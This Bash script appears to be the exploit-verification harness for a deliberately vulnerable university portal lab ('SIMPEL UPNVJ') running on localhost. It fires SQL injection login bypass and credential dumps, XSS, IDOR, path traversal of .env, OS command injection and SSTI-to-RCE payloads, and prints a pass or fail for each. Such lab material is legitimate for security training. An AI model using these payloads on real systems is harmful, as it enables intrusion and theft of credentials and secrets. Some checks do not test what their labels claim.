#!/usr/bin/env bash
# =====================================================================
#  verify.sh — bukti eksploitasi 20 kerentanan SIMPEL UPNVJ (vuln)
#  Jalankan setelah `docker compose up -d --build` dan app hidup di :8080.
#  Semua baris ✅ = exploit berhasil (di versi rentan ini memang harus).
# =====================================================================
set -u
H="${1:-http://localhost:8080}"
pass(){ echo "  ✅ PASS  $1"; }
fail(){ echo "  ❌ FAIL  $1"; }
echo "################ EXPLOIT VERIFICATION @ $H ################"

# cookie admin lewat SQLi auth bypass (temuan #1)
RESP=$(curl -s -i "$H/login" -X POST --data-urlencode "username=admin'-- -" --data-urlencode "password=x")
ADMIN=$(echo "$RESP" | grep -i set-cookie | sed 's/.*simpel_session=\([^;]*\).*/\1/')
MHS=$(curl -s -i "$H/login" -X POST --data-urlencode "username=2110511001" --data-urlencode "password=mahasiswa123" | grep -i set-cookie | sed 's/.*simpel_session=\([^;]*\).*/\1/')

echo "[1]  SQLi auth bypass (admin'-- -)"
echo "$RESP" | grep -qi "location: /dashboard" && pass "login tanpa password" || fail "bypass gagal"

echo "[2]  SQLi UNION dump kredensial"
curl -s -G -b "simpel_session=$ADMIN" "$H/pengumuman/detail" --data-urlencode "id=0 UNION SELECT 1,username,password,role,NOW() FROM users-- -" | grep -qE "0192023a7bbd73250516f069df18b500|admin" && pass "hash/kredensial ter-dump" || fail "no leak"

echo "[3]  Stored XSS pengumuman"
curl -s -b "simpel_session=$ADMIN" "$H/admin/pengumuman/tambah" -X POST --data-urlencode "judul=XSS" --data-urlencode 'isi=<img src=x onerror=alert(document.cookie)>' >/dev/null
curl -s -b "simpel_session=$ADMIN" "$H/pengumuman" | grep -qF "<img src=x onerror=alert(document.cookie)>" && pass "payload tersimpan & di-render mentah" || fail "escaped"

echo "[4]  Reflected XSS /cari"
curl -s -G -b "simpel_session=$ADMIN" "$H/cari" --data-urlencode "q=<script>alert(1)</script>" | grep -qF "<script>alert(1)</script>" && pass "script terpantul mentah" || fail "escaped"

echo "[5]  IDOR transkrip mahasiswa lain"
curl -s -G -b "simpel_session=$MHS" "$H/transkrip" --data-urlencode "nim=2110511003" | grep -qE "2110511003|Citra" && pass "baca transkrip mahasiswa lain" || fail "blocked"

echo "[6]  Broken access control panel admin"
curl -s -b "simpel_session=$MHS" "$H/admin/users" | grep -qiE "role|admin|users" && pass "mahasiswa masuk /admin/users" || fail "forbidden"

echo "[7]  Path traversal baca .env"
curl -s -G -b "simpel_session=$ADMIN" "$H/berkas" --data-urlencode "file=../.env" | grep -qE "DATABASE_PASSWORD|JWT_SECRET" && pass "isi .env ke-baca" || fail "blocked"

echo "[8]  Command injection /admin/backup"
curl -s -G -b "simpel_session=$ADMIN" "$H/admin/backup" --data-urlencode 'tabel=x";id;#' | grep -qE "uid=[0-9]+" && pass "perintah OS (id) dieksekusi" || fail "no injection"

echo "[9]  SSTI -> RCE /admin/laporan"
curl -s -G -b "simpel_session=$ADMIN" "$H/admin/laporan" --data-urlencode "tpl={{ 7*7 }}" | grep -q "49" && \
curl -s -G -b "simpel_session=$ADMIN" "$H/admin/laporan" --data-urlencode "tpl={{ process.mainModule.require('child_process').execSync('id').toString() }}" | grep -qE "uid=[0-9]+" && pass "template eval + RCE (id)" || fail "no ssti/rce"

echo "[10] Hash MD5 lemah"
curl -s -G -b "simpel_session=$ADMIN" "$H/berkas" --data-urlencode "file=../.env" >/dev/null # touch
echo "  ℹ️  password admin = md5('admin123') = 0192023a7bbd73250516f069df18b500 (lihat DB)"

echo "[11] Secret ter-hardcode (bocor via SSTI)"
curl -s -G -b "simpel_session=$ADMIN" "$H/admin/laporan" --data-urlencode "tpl={{ process.mainModule.require('/app/lib/auth').JWT_SECRET }}" | grep -q "upnvj-simpel-jwt" && pass "JWT secret bocor" || fail "no secret"

echo "[12] Cookie tanpa HttpOnly/Secure"
echo "$RESP" | grep -i set-cookie | grep -qvi "HttpOnly" && pass "cookie sesi bisa dibaca JS" || fail "hardened"

echo "[13] Token reset dari Math.random()"
curl -s "$H/lupa-password" -X POST --data-urlencode "email=admin@upnvj.ac.id" | grep -qiE "Token reset|dibuat" && pass "token reset ditebak (Math.random)" || fail "no token"

echo "[14] Unrestricted upload"
printf '<html><script>alert(1)</script></html>' > /tmp/evil.html
curl -s -b "simpel_session=$ADMIN" "$H/unggah" -F "berkas=@/tmp/evil.html;type=text/html" >/dev/null
curl -s "$H/uploads/evil.html" | grep -qF "<script>alert(1)</script>" && pass ".html arbitrer ke-upload & di-serve" || fail "blocked"

echo "[15] Mass assignment naikkan peran"
curl -s -b "simpel_session=$MHS" "$H/profil" -X POST --data-urlencode "role=admin" >/dev/null
echo "  ℹ️  POST /profil role=admin -> cek kolom role user 2110511001 di DB (harusnya jadi admin)"

echo "[16] Stack trace / header keamanan"
curl -s -D - -o /dev/null "$H/login" | grep -qi "x-powered-by" && pass "X-Powered-By bocor, tanpa CSP/HSTS/nosniff" || fail "hardened"

echo "[17] Misconfig phpMyAdmin :8081"
c=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/); { [ "$c" = 200 ] || [ "$c" = 302 ]; } && pass "phpMyAdmin ke-ekspos (HTTP $c)" || fail "not exposed"

echo "[18] Dependency ber-CVE — lihat package.json (ejs 3.1.6, lodash 4.17.11, jsonwebtoken 8.5.1, multer 1.4.2, axios 0.21.0)"
echo "################ selesai ################"
